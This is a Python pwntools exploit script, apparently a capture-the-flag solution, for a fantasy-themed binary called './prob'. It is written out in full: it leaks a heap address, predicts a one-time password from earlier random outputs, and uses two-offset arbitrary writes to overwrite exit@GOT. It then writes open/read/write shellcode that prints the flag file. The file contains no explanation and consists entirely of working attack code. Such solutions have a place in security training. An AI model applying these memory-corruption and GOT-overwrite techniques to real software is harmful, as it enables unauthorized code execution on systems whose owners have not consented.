from pwn import *

p = process('./prob')
context.arch = 'amd64'

CONCLAVE = 0x404100
EXIT = 0x404090

def seal_a_scroll(size, content):
    p.sendlineafter(b'Cast Your Will > ', b'6')
    p.sendlineafter(b'Scroll size (max 32 bytes): ', str(size).encode())
    p.sendafter(b'Scroll content: ', content)
    
def read_sealed_scrolls():
    p.sendlineafter(b'Cast Your Will > ', b'5')
    p.recvuntil(b'[Sealed Scrolls of the Conclave]\n')
    content = p.recvline().split(b'. ', 1)
    result = u64(content[1][:-1].ljust(8, b'\x00'))
    return result

def Incant_a_spell(nums):
    p.sendlineafter(b'Cast Your Will > ', b'1')
    p.recvuntil(b'[Spell Incantation] ')
    num1 = int(p.recvuntil(b' ')[:-1])
    p.recvuntil(b'+ ')
    num2 = int(p.recvuntil(b' ')[:-1])
    ans = str((num1 + num2) % 2**32).encode()
    p.sendlineafter(b'> ', ans)
    nums.append(num1)
    nums.append(num2)
    
def present_yourself(num):
    p.sendlineafter(b'Cast Your Will > ', b'2')
    p.sendlineafter(b'> ', b'2')
    p.sendlineafter(b"Archmage's Prophetic Rune (OTP): ", str(num).encode())
    check = p.recvline()
    if check == b'[+] The Conclave bows. Welcome, Archmage.\n':
        success('success')
    else:
        success('fail')
        exit()

def rewrite_the_grimoire(off1, msg1, off2, msg2):
    p.sendlineafter(b'Cast Your Will > ', b'4')
    p.sendlineafter(b'Grimoire Rune Offset 1: ', str(off1).encode())
    p.sendafter(b'New Incantation 1: ', msg1)
    p.sendlineafter(b'Grimoire Rune Offset 2: ', str(off2).encode())
    p.sendafter(b'New Incantation 2: ', msg2)
        
# init
p.sendafter(b'Name Your Conclave: ', p64(0x404121) + p64(0))
p.sendafter(b'Inscribe the Grand Grimoire (max 0x420 bytes): ', b'A')

# leak heap address
seal_a_scroll(16, b'A')
heap = read_sealed_scrolls()

part1 = heap & 0xfff00000
part2 = ((heap >> 12) ^ heap) & 0xff000
HEAP_BASE = part1 + part2 - 0x2000
GRIMOIRE = HEAP_BASE + 0x2a0
REWRITE_CHANCE_OFFSET =  CONCLAVE + 0x44 - GRIMOIRE
SCROLL_ROOT_OFFSET = CONCLAVE + 0x38 - GRIMOIRE
EXIT_OFFSET = EXIT - GRIMOIRE
GRIMOIRE_OFFSET = CONCLAVE + 0x28 - GRIMOIRE

success(f'heap_base = {HEAP_BASE:#x}')
success(f'grimoire =  {GRIMOIRE:#x}')
success(f'rewrite_chance = {REWRITE_CHANCE_OFFSET:#x}')

# ascend to Archmage
nums = list()
for _ in range(16):
    Incant_a_spell(nums)
exp = (nums[1] + nums[29]) % 2**31
present_yourself(exp)

# leak summoning_circle
rewrite_the_grimoire(REWRITE_CHANCE_OFFSET, p32(9999) + p32(1), SCROLL_ROOT_OFFSET, p64(CONCLAVE))
summoning_circle = (read_sealed_scrolls() << 8)
success(f'summoning_circle = {summoning_circle:#x}')

# overwrite exit@got and grimoire
rewrite_the_grimoire(EXIT_OFFSET, p64(summoning_circle), GRIMOIRE_OFFSET, p64(summoning_circle))

# ORW
orw = shellcraft.open('./flag', 0, 0)
orw += shellcraft.read('rax', 'rsp', 0x30)
orw += shellcraft.write(1, 'rsp', 0x30)
orw = asm(orw)

# exploit
for i in range(0, len(orw), 16):
    rewrite_the_grimoire(i, orw[i:i+8], i+8, orw[i+8:i+16])
    
p.sendlineafter(b'Cast Your Will > ', b'7')

p.interactive()